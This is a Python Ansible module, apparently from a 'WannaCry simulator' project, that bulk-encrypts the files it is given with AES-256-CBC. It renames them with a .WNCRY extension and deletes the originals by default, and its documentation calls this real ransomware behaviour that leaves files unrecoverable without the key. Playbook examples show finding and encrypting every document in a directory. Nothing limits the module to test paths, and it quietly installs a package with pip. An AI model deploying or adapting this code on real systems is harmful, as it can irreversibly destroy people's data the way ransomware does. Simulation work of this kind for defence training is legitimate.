#!/usr/bin/python
# -*- coding: utf-8 -*-

from __future__ import absolute_import, division, print_function
__metaclass__ = type

import sys
import subprocess

# Auto-install cryptography if not available
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'cryptography'])
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except Exception:
        pass  # Will be handled by layer2_orchestrators

DOCUMENTATION = r'''
---
module: encrypt_files_aes

short_description: Bulk AES-256-CBC file encryption (Layer 2)

description:
  - Orchestrates bulk file encryption using Layer 1 AES-256-CBC primitive
  - Simulates WannaCry ransomware encryption behavior
  - Encrypts files with random or specified key
  - Deletes originals unless keep_original is set
  - Uses same encryption method as real WannaCry malware
  
version_added: "2.0.0"

options:
  files:
    description: List of file paths to encrypt
    required: true
    type: list
    elements: str
    
  key:
    description:
      - AES-256 encryption key (64 hex characters = 32 bytes)
      - If not provided, a random key will be generated
    required: false
    type: str
    default: null
    
  encrypted_extension:
    description: Extension to add to encrypted files
    required: false
    type: str
    default: "WNCRY"
    
  keep_original:
    description:
      - Keep original files after encryption (for testing)
      - Real ransomware behavior is to delete originals (keep_original=false)
    required: false
    type: bool
    default: false

requirements:
  - python >= 3.8
  - cryptography

notes:
  - Uses Layer 1 primitive encrypt_file_aes256_cbc() from module_utils.layer1_primitives
  - Uses Layer 2 orchestrator encrypt_files_bulk() from module_utils.layer2_orchestrators
  - Encryption format: [16-byte IV] + [AES-256-CBC encrypted data with PKCS7 padding]
  - This is REAL encryption - files cannot be recovered without the key

author:
  - Filesystem Forensics Team
'''

EXAMPLES = r'''
# Encrypt files with random key
- name: Encrypt victim files
  encrypt_files_aes:
    files:
      - /tmp/wannacry_simulator/file1.docx
      - /tmp/wannacry_simulator/file2.pdf
      - /tmp/wannacry_simulator/file3.jpg
    encrypted_extension: "WNCRY"

# Encrypt with specific key (for testing/recovery)
- name: Encrypt with known key
  encrypt_files_aes:
    files:
      - /tmp/document.docx
    key: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
    keep_original: true

# Encrypt all files in directory (using with_fileglob)
- name: Find and encrypt all documents
  find:
    paths: /tmp/wannacry_simulator
    patterns: "*.docx,*.pdf,*.xlsx,*.txt,*.jpg"
  register: files_to_encrypt

- name: Encrypt found files
  encrypt_files_aes:
    files: "{{ files_to_encrypt.files | map(attribute='path') | list }}"
    encrypted_extension: "WNCRY"
'''

RETURN = r'''
changed:
  description: Whether any files were encrypted
  type: bool
  returned: always
  sample: true

encrypted_files:
  description: List of successfully encrypted files (with .WNCRY extension)
  type: list
  returned: always
  sample: ["/tmp/file1.docx.WNCRY", "/tmp/file2.pdf.WNCRY"]

encryption_key:
  description: AES-256 key used (hex format, 64 characters)
  returned: always
  type: str
  sample: "a1b2c3d4e5f6..."

failed_files:
  description: List of files that failed to encrypt
  type: list
  returned: always
  sample: []

total_encrypted:
  description: Number of files successfully encrypted
  type: int
  returned: always
  sample: 10

total_failed:
  description: Number of files that failed encryption
  type: int
  returned: always
  sample: 0
'''

import os
from ansible.module_utils.basic import AnsibleModule


def main():
    """
    Main execution function for encrypt_files_aes module.
    
    This module acts as an Ansible interface to the Layer 2 orchestrator
    encrypt_files_bulk() from module_utils.layer2_orchestrators.
    
    Workflow:
        1. Parse and validate module arguments
        2. Generate or parse encryption key
        3. Import Layer 2 orchestrator
        4. Call orchestrator to encrypt files
        5. Return results in Ansible format
    """
    
    # Define module argument specification
    module = AnsibleModule(
        argument_spec=dict(
            files=dict(type='list', elements='str', required=True),
            key=dict(type='str', required=False, default=None, no_log=True),
            encrypted_extension=dict(type='str', required=False, default='WNCRY'),
            keep_original=dict(type='bool', required=False, default=False)
        ),
        supports_check_mode=False
    )
    
    # Extract parameters
    files = module.params['files']
    key_hex = module.params['key']
    encrypted_extension = module.params['encrypted_extension']
    keep_original = module.params['keep_original']
    
    # Validate files list
    if not files or len(files) == 0:
        module.fail_json(msg="files list cannot be empty")
    
    # Generate or parse encryption key
    if key_hex:
        # Validate provided key
        if len(key_hex) != 64:
            module.fail_json(msg="key must be 64 hex characters (32 bytes for AES-256)")
        
        try:
            key_bytes = bytes.fromhex(key_hex)
        except ValueError:
            module.fail_json(msg="key must contain valid hexadecimal characters")
    else:
        # Generate random 32-byte key
        key_bytes = os.urandom(32)
        key_hex = key_bytes.hex()
    
    # Import Layer 2 orchestrator
    try:
        from ansible.module_utils import layer2_orchestrators as l2
    except ImportError as e:
        module.fail_json(msg=f"Failed to import layer2_orchestrators: {str(e)}")
    
    # Call Layer 2 orchestrator to encrypt files
    try:
        success, encrypted_files, failed_files, error = l2.encrypt_files_bulk(
            files=files,
            encryption_key=key_bytes,
            encrypted_extension=encrypted_extension,
            keep_originals=keep_original
        )
        
        if not success:
            module.fail_json(msg=f"Bulk encryption failed: {error}")
        
        # Return success results
        module.exit_json(
            changed=True,
            encrypted_files=encrypted_files,
            encryption_key=key_hex,
            failed_files=[f[0] for f in failed_files],  # Extract filenames
            total_encrypted=len(encrypted_files),
            total_failed=len(failed_files),
            msg=f"Encrypted {len(encrypted_files)} files successfully"
        )
        
    except Exception as e:
        module.fail_json(msg=f"Unexpected error during encryption: {str(e)}")


if __name__ == '__main__':
    main()
